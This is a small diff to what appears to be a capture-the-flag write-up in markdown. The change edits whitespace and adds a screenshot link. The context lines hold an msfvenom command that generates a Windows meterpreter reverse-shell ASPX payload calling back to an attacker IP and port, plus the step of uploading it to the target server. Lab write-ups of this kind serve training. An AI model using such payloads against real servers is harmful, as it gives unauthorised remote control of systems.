@@ -42,9 +42,10 @@ To get reverse shell, i used metasploit to create reverse shell
 
 ```
 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.9.3.188 lport=4444 -f aspx -o shell.aspx 
-``` 
- 
-Upload to server and get reverse shell 
+```  
+ Upload to server and get reverse shell  
+  
+![image](https://user-images.githubusercontent.com/22276823/147275061-af1fc217-56f6-4d9f-be29-d8f6300ed507.png)  
 
 ![image](https://user-images.githubusercontent.com/22276823/147272992-34b30903-44ae-4e13-8848-f593952350d7.png)  
  
